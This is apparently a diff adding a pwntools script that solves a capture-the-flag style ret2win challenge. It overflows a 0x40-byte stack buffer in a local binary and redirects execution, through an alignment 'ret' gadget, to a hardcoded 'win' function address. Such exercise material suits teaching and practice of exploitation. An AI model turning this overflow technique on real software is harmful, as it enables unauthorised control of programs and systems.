@@ -1,0 +1,44 @@
+```python
+import argparse
+from pwn import *
+
+def main():
+    parser = argparse.ArgumentParser()
+    parser.add_argument("binary", nargs="?", default=None)
+    parser.add_argument("--binary", dest="binary_flag", default=None)
+    args = parser.parse_args()
+    binary = args.binary_flag or args.binary
+    if not binary:
+        raise SystemExit("missing binary path")
+
+    # Set up pwntools context
+    context.binary = binary
+    context.log_level = 'error'
+
+    p = process(binary)
+    
+    # The buffer is 0x40 bytes, plus 8 bytes for the saved RBP
+    offset = 0x48
+    
+    # Address of the win function
+    win_addr = 0x4011b6
+    
+    # Address of a 'ret' instruction to align the stack to 16 bytes
+    # (Required for system/puts calls inside win on 64-bit Ubuntu)
+    ret_addr = 0x401228
+    
+    # Construct the payload
+    payload = b'A' * offset
+    payload += p64(ret_addr)
+    payload += p64(win_addr)
+    
+    # Send the payload
+    p.send(payload)
+    
+    # Read and print all output
+    output = p.recvall(timeout=3)
+    print(output.decode(errors='replace'))
+
+if __name__ == "__main__":
+    main()
+```
